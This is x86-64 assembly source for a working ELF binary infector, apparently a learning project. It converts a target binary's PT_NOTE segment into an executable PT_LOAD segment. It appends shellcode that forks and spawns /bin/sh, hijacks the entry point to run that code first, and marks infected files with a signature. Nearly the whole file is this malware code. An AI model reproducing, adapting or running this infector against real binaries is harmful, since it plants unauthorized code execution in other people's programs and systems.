section .data


    banner db 10,
    db "    ███████╗██╗     ███████╗    ██╗███╗   ██╗███████╗███████╗ ██████╗████████╗ ██████╗ ██████╗", 10,
    db "    ██╔════╝██║     ██╔════╝    ██║████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗", 10,
    db "    █████╗  ██║     █████╗      ██║██╔██╗ ██║█████╗  █████╗  ██║        ██║   ██║   ██║██████╔╝", 10,
    db "    ██╔══╝  ██║     ██╔══╝      ██║██║╚██╗██║██╔══╝  ██╔══╝  ██║        ██║   ██║   ██║██╔══██╗", 10,
    db "    ███████╗███████╗██║         ██║██║ ╚████║██║     ███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║", 10,
    db "    ╚══════╝╚══════╝╚═╝         ╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝", 10,
    db " by Mathis TEMPO", 10, 10, 0
    banner_len equ $ - banner

	buf times 4 db 0            ; Buffer for the 4 first bytes
	ELF_numbers db 0x7F, 0x45, 0x4C , 0x46  ; ELF magic numbers
	not_ELF_msg db "error, the file printed is not an ELF file.", 0xA, 0
	error_msg db "The programm returned an error", 0xA, 0
	error_msg_args db "error, only one argument is needed. Syntax : ./infector file", 0xA, 0
	error_msg_folder db "error, the file printed is a folder. Please enter an ELF file.", 0xA, 0
    error_msg_file db "error, the specified path is incorrect. Syntax : ./infector file", 0xA, 0
	success_msg db "Bravo, the file is well infected !", 0xA, 0

    ; Our payload - spawns /bin/sh
    align 4  ; Ensure the payload is 4-byte aligned (better for performance, and can avoid some memory access problems)
    payload_start:
    payload_buffer:
        db 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0xb8, 0x39, 0x00, 0x00, 0x00,
        db 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x75, 0x25, 0x48, 0x31, 0xd2, 0x48, 0xbb,
        db 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7,
        db 0x48, 0x31, 0xf6, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c,
        db 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0xb8,
        db 0x3d, 0x00, 0x00, 0x00, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x4d, 0x31,
        db 0xd2, 0x0f, 0x05, 0x5d, 0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58, 0xe9
    jmp_offset dd 0  ; save some space (dd = double word = 4bytes) for the offset to jump to the original entry point
    payload_size equ $ - payload_start  ; Calculate payload size


    signature db "TEMP0_INF", 0         
    already_infected_msg db "Warning : The file has already been infected by this infector !", 0xA, 0
    already_infected_len equ $ - already_infected_msg

section .bss 

	stat_buff resb 144          ; reserve bytes(saving space : 144bytes) for the fstat command later
	ELF_header_buff resb 64     ; save space to read and parse the ELF header
	program_header_buff resb 56 ; same for the program header 
	
    phoff resq 1            ; reserve quadword = 4 times a word size = 8 bytes / save space to store the memory address for the beginning of the program headers
	current_phoff resq 1    ; to store the actual offset while looping  (each loop we increment it)
    phnum resw 1            ; reserve word = 2 times a word size = 2 bytes / save space to store the number of program headers

	filename resb 256  
	fd resd 1       ; to save the file descriptor troughout our code  
	
    last_load_end resq 1   ; Save space to store the end of the last LOAD segment 
    current_save resq 1    ; Buffer to scan every segments
    temp_header resb 56    ; Temporary buffer for headers

    signature_buffer resb 8              ; buffer for our signature while infecting 

section .text
    global _start



;--------------------
; Program entry point 
;--------------------
_start:
	mov rdi, [rsp]       ; get argc from stack 
	cmp rdi, 2           ; argc must be equal to 2 (name of the program + first argument) 
    jne wrong_args    
          
    mov rsi, [rsp + 16]     ; argv[1]
    mov rdi, filename       ; Pour garder la compatibilité avec le code existant
    call copy_string
    call main
    jmp exit_program

;--------------------------------------
; Handles incorrect number of arguments
;--------------------------------------
wrong_args:
    mov rsi, error_msg_args  
    mov rdx, 61
    call print_message
    mov rax, 60
    mov rdi, 1
    syscall


;-----------------------------------------------------------------------------------------------------------------------------
; Copies a null-terminated string from source to destination  ( RSI = source string pointer RDI = destination buffer pointer ) 
;-----------------------------------------------------------------------------------------------------------------------------
copy_string:
    mov al, [rsi]       
    mov [rdi], al      
    test al, al        ; check if the caracter is null
    je copy_done       ; if null, copy is complete
    inc rsi             
    inc rdi           
    jmp copy_string    ; else, continue with the next caracter  

copy_done:
    ret  
    

;-------------------
; Main program logic
;-------------------
main: 
    call stat_file	
    call check_if_regular_file
    call check_elf
    call check_if_infected    
    call introduction
	call parse_elfheader
	call parse_programm_header
    call close_file
    ret


;-----------------------------------------------
; Checks if file exists and gets its information
;-----------------------------------------------
stat_file:
    mov rax, 4          ; sys_stat syscall
    mov rdi, filename
    mov rsi, stat_buff  ; store the file info
    syscall
    test rax, rax
    js error_file       ; file not found
    ret


;---------------------------
; Handles file access errors
;---------------------------
error_file:
    mov rsi, error_msg_file  
    mov rdx, 65
    call print_message
    mov rax, 60
    mov rdi, 1
    syscall

	
;----------------------------------
; Ensure the file is a regular file
;----------------------------------
check_if_regular_file:
    mov rax, [stat_buff + 24]  ; load st_mode (16 bytes in the stat structure)
    and rax, 0xF000            ; mask to isolate the mask type bites (the "file type" bytes are located in the first 4 bytes) 
    cmp rax, 0x8000            ; 0x8000 = S_IFREG (regular file)
    je is_regular_file
    
    mov rsi, error_msg_folder
    mov rdx, 63
    call print_message
    jmp exit_program

is_regular_file:
	ret

    

;--------------------------------
; Verifies if file is a valid ELF
;--------------------------------
check_elf:

	; Open the file
	mov rax, 2      ; sys_open
	mov rdi, filename
	mov rsi, 2      ; read-write (O_RDWR flag)
	syscall
	test rax, rax
	js error
	mov [fd], rax    ; Save file descriptor


	; read the first 4 bytes
	mov rdi, [fd]
	mov rax, 0                   ; sys_read 
	mov rsi, buf                 
	mov rdx, 4                   ; 4 bytes
	syscall
	test rax, rax
	js error
	
	mov rcx, 4                   ; counter for the loop 
	xor rdi, rdi     
	
	call compare_loop
	
	ret
	

;-----------------------------------------------
; Compares file magic numbers with ELF signature
;-----------------------------------------------
compare_loop: 
	mov al, [buf + rdi]
	cmp al, [ELF_numbers + rdi]
	jne not_ELF
	inc rdi
	dec rcx
    jnz compare_loop
	ret

;---------------------------
; Handles non-ELF file error
;---------------------------
not_ELF:
	mov rsi, not_ELF_msg
	mov rdx, 44
	call print_message
	jmp exit_program 

    
;-------------
; Nice artwork
;-------------
introduction:
    mov rsi, banner
    mov rdx, banner_len
    call print_message
    ret


;__________________________________________________Parsing structures______________________________________________________________



;------------------------------------------------------------------------
; Parses ELF header to extract program header information (phoff & phnum)
;------------------------------------------------------------------------
parse_elfheader:

    ; set ourselves at the beginning of the file   
    mov rax, 8          
    mov rdi, [fd]       
    mov rsi, 0          ; offset 0 (beginning)
    mov rdx, 0          ; SEEK_SET
    syscall
    test rax, rax
    js error

    ; read ELF header
	mov rax, 0
	mov rdi, [fd]
	mov rsi, ELF_header_buff    ; store it in our buffer
	mov rdx, 64                 ; number of bytes to read
	syscall
	test rax, rax
	js error

	mov rax, [ELF_header_buff + 0x20]   ; extract e_phoff
	mov [phoff], rax                    

	movzx rax, word[ELF_header_buff + 0x38]   ; extract e_phnum / movzx : fills the superior bytes of the rax with 0 to ensure its the good value
	mov [phnum], rax

	ret



;-----------------------------------------------
; Parses program headers to find PT_NOTE segment
;-----------------------------------------------
parse_programm_header:
  	mov rcx, [phnum]              ; number of program headers
    mov rax, [phoff]              ; offset to programm headers
    mov [current_phoff], rax      ; save current position

	jmp parse_loop


parse_loop:

	test rcx, rcx       ; check if we analyzed every programm header (counter=0)
	jz end_parse

    ; lseek : to place ourselves at the current offset
	mov rax, 8              
	mov rdi, [fd]
	mov rsi, [current_phoff]
	mov rdx, 0
	syscall 
	test rax, rax
	js error
	
	; read program header 
	mov rax, 0        
	mov rdi, [fd]
	mov rsi, program_header_buff
	mov rdx, 56	
	syscall
	test rax, rax
	js error


    ; Check if segment is PT_NOTE
	mov eax, [program_header_buff]     ; get segment type 
	cmp eax, 0x00000004                ; compare with PT_NOTE
	je pt_note_found


    ; Move to next program header
    add qword [current_phoff], 56       ; advance to next programm header (1 = 56 bytes)
    dec rcx
    jmp parse_loop


end_parse:
	ret 
	

;---------------------------------------------
; Main infection : converts PT_NOTE to PT_LOAD
;---------------------------------------------
pt_note_found:

    mov r15, [current_phoff]       ; Save PT_NOTE offset for later modification

    ; Initialize scan for last LOAD segment
    mov qword [last_load_end], 0
    mov rcx, [phnum]
    mov rax, [phoff]
    mov [current_save], rax

;----------------------------------------------------------
; Finds the last LOAD segment to find space for our payload
;----------------------------------------------------------
scan_load_segments:
    push rcx        ; save loop counter
    push rax        ; save current offset
    
    ; Read programm header
    mov rax, 8              ; lseek
    mov rdi, [fd]
    mov rsi, [current_save]
    mov rdx, 0
    syscall

    mov rax, 0        
    mov rdi, [fd]
    mov rsi, temp_header
    mov rdx, 56
    syscall

    ; Check if LOAD segment
    mov eax, [temp_header]
    cmp eax, 1              ; PT_LOAD type
    jne next_load_seg

    ; Calculate end of this segment in memory
    mov rax, [temp_header + 16]     ; get virtual address (p_vaddr)
    add rax, [temp_header + 32]     ; + segment size (p_filesz)
    add rax, 0x1000                 ; Add one page margin
    and rax, ~0xFFF                 ; Page align  (~ : reverse every byte, like a logic AND)
    cmp rax, [last_load_end]        ; Compare with current last (=highest memory address we found) 
    jle next_load_seg
    mov [last_load_end], rax        ; update if highest end found


next_load_seg:
    pop rax                     ; restore offset
    add rax, 56                 ; move to next programm header
    mov [current_save], rax
    pop rcx                     ; restore counter
    dec rcx
    jnz scan_load_segments


;-------------------------------------------------
; Setup new payload location and prepare infection
;-------------------------------------------------

    ; Calculate new virtual address for payload
    mov r13, [last_load_end]     ; save end of the last segment 
    add r13, 0x1000              ; add margin 
    and r13, ~0xFFF              ; align 

    ; Get EOF and align it 
    mov rax, 8              ; lseek
    mov rdi, [fd]
    mov rsi, 0
    mov rdx, 2              ; SEEK_END
    syscall
    mov r12, rax            ; save EOF

    ; Save original entry point 
    mov rax, 8                      
    mov rdi, [fd]
    mov rsi, 24                   ; e_entry offset  
    mov rdx, 0                      
    syscall

    mov rax, 0                      
    mov rdi, [fd]
    mov rsi, ELF_header_buff + 24   
    mov rdx, 8
    syscall
    mov rbx, [ELF_header_buff + 24]  ; Original entry stored in rbx

   ; Calculate the new closest virtual address (payload location)
    mov r13, [last_load_end]        ; base address : after the last load segment
    add r13, 0x1000                 ; one page gap is enough
    and r13, ~0xFFF                 ; align page


	; Align the file offset
    mov rax, r12                    ; EOF
    add rax, 0xFFF                  ; round to the superior page
    and rax, ~0xFFF                 ; align
    mov r12, rax                    ; Save EOF aligned


;------------------------------------------
; Update program headers and inject payload
;------------------------------------------


    ; Update entry point to point to our payload
    mov rax, 8                      
    mov rdi, [fd]
    mov rsi, 24                     
    mov rdx, 0                      
    syscall

   ; Write new entry point
    mov rax, r13                    
    mov [ELF_header_buff + 24], rax  ; Set new entry point
    mov rax, 1                      
    mov rdi, [fd]
    mov rsi, ELF_header_buff + 24
    mov rdx, 8
    syscall

    ; Convert PT_NOTE to PT_LOAD
    mov dword [program_header_buff], 1          ; PT_LOAD type
    mov dword [program_header_buff + 4], 5      ; RX flags
    mov qword [program_header_buff + 8], r12    ; p_offset : EOF
    mov qword [program_header_buff + 16], r13   ; p_vaddr
    mov qword [program_header_buff + 24], r13   ; p_paddr

   ; Set segment size and alignment
    mov rax, payload_size
    add rax, 0xFFF
    and rax, ~0xFFF
    mov qword [program_header_buff + 32], rax       ; p_filesz
    mov qword [program_header_buff + 40], rax       ; p_memsz
    mov qword [program_header_buff + 48], 0x1000    ; p_align

    ;  Calculate return jmp 
    mov rax, rbx                    ; Original entry
    sub rax, r13                    ; sub new base
    sub rax, payload_size           ; Sub payload size 
    mov [jmp_offset], eax           ; save jmp offset

    ; Write payload at EOF
    mov rax, 8                      
    mov rdi, [fd]
    mov rsi, r12                    
    mov rdx, 0                      
    syscall
	test rax, rax                   
    js error


    mov rax, 1
    mov rdi, [fd]
    mov rsi, payload_start
    mov rdx, payload_size
    syscall
    cmp rax, payload_size
    jne error


    ; Write modified header
    mov rax, 8                      
    mov rdi, [fd]
    mov rsi, r15                    ; PT_NOTE offset previously saved
    mov rdx, 0                      
    syscall

    mov rax, 1                      
    mov rdi, [fd]
    mov rsi, program_header_buff
    mov rdx, 56                     
    syscall

;---------------------------------------------------------------------------
; Update section headers if needed (e_shoff value must be after our payload)
;---------------------------------------------------------------------------

    mov rax, [ELF_header_buff + 40]    ; get section header offset (e_shoff)
    cmp rax, r12                       ; compare with our payload position
    jbe no_shoff_update

    ; Adjust section header offset
    add rax, payload_size
    mov [ELF_header_buff + 40], rax
    

    ; Write updated ELF header
    mov rax, 8                      
    mov rdi, [fd]
    mov rsi, 0                     
    mov rdx, 0                      
    syscall

    mov rax, 1                      
    mov rdi, [fd]
    mov rsi, ELF_header_buff
    mov rdx, 64                     
    syscall

no_shoff_update:
    call write_signature    
    mov rsi, success_msg
    mov rdx, 35
    call print_message
    ret

;-------------------------------------------------------------
; Ensures the file was not previously infected by our programm 
;-------------------------------------------------------------
check_if_infected:
    ; Save the actual position in the file 
    mov rax, 8                  ; lseek
    mov rdi, [fd]
    xor rsi, rsi
    mov rdx, 1                  ; SEEK_CUR
    syscall
    push rax                    

    ; Go to the end 
    mov rax, 8                 
    mov rdi, [fd]
    mov rsi, -8               
    mov rdx, 2                  ; SEEK_END
    syscall

    ; Read the potential signature 
    mov rax, 0                 
    mov rdi, [fd]
    mov rsi, signature_buffer
    mov rdx, 8                  
    syscall

    ; Compare with our signature 
    mov rsi, signature
    mov rdi, signature_buffer
    mov rcx, 8                  
    repe cmpsb                  
    jne not_infected

    ; Restore position and end programm if its already infected
    pop rax
    mov rsi, rax
    mov rax, 8                
    mov rdi, [fd]
    mov rdx, 0                  ; SEEK_SET
    syscall

    mov rsi, already_infected_msg
    mov rdx, already_infected_len
    call print_message
    jmp exit_program


;----------------------------------------------------------------------------------------
; Restore the position and continue the execution if the file was not previously infected
;----------------------------------------------------------------------------------------
not_infected:
    pop rax
    mov rsi, rax
    mov rax, 8                 
    mov rdi, [fd]
    mov rdx, 0                 
    syscall
    ret

;--------------------------------------------
; Writes our signature at the end of the file
;--------------------------------------------
write_signature:
    ; We position ourselves after the payload
    mov rax, 8                  ; lseek
    mov rdi, [fd]
    mov rsi, r12               ; EOF
    add rsi, payload_size      ;  after the payload
    mov rdx, 0                 ; SEEK_SET
    syscall

    ; write it
    mov rax, 1                
    mov rdi, [fd]
    mov rsi, signature
    mov rdx, 8                 
    syscall
    ret

;---------------------------------
; Closes the currently opened file
;---------------------------------
close_file:		
	mov rdi, [fd]  
	mov rax, 3      ;sys_close 
	syscall        
	ret


;---------------------------
; Prints a message to stdout
;---------------------------    
print_message:
    mov rax, 0x1               
    mov rdi, 1                 
    syscall
    ret

;-------------------
; Clean program exit
;-------------------
exit_program:
	mov rax, 60                  
	xor rdi, rdi                
	syscall


;--------------
; Error handler
;--------------
error:
	mov rax, 0x1
	mov rdi, 1 
	mov rsi, error_msg
	mov rdx, 31
	syscall
	mov rax, 60                 
	mov rdi, 1                    ; Exit code 1
	syscall
